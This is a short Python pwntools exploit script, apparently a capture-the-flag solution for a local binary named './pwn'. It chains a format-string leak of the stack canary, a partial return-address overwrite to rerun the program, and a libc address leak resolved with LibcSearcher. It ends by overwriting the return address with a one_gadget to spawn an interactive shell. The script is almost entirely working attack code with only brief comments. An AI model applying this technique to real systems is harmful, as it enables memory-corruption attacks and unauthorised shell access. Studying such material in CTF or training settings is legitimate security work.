from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',log_level='DEBUG')

p = process('./pwn')

# part1: leak canary by fmt

p.recvuntil('\n')
p.send('%9$p')

canary = int(p.recv(18),16)
log.success('canary = %#x',canary)
# gdb.attach(p)
# pause()

# part2: overwrite the ret's low bit to re-execute the program
p.send('AAAAAA')
p.recv()
payload = 'B'*(0x50-0x18) + p64(canary) + 'C'*0x18 + '\x08' 
p.send(payload)

# part3: leak libc
p.recv()
p.send('%7$p')
# setvbuf+144
setvbuf_addr = int(p.recv(14),16) - 0x144
log.success("setvbuf_addr = %#x",setvbuf_addr)

libc = LibcSearcher('setvbuf',setvbuf_addr)
libc_base = setvbuf_addr - libc.dump('setvbuf')
one_gadet = 0xf1147

# part4: overwirte the ret to point to one gadget

p.send('AAAA')
payload = 'B'*(0x50-0x18) + p64(canary) + 'C'*0x18 + p64(one_gadet + libc_base)
p.send(payload)
sleep(0.1)
p.interactive()
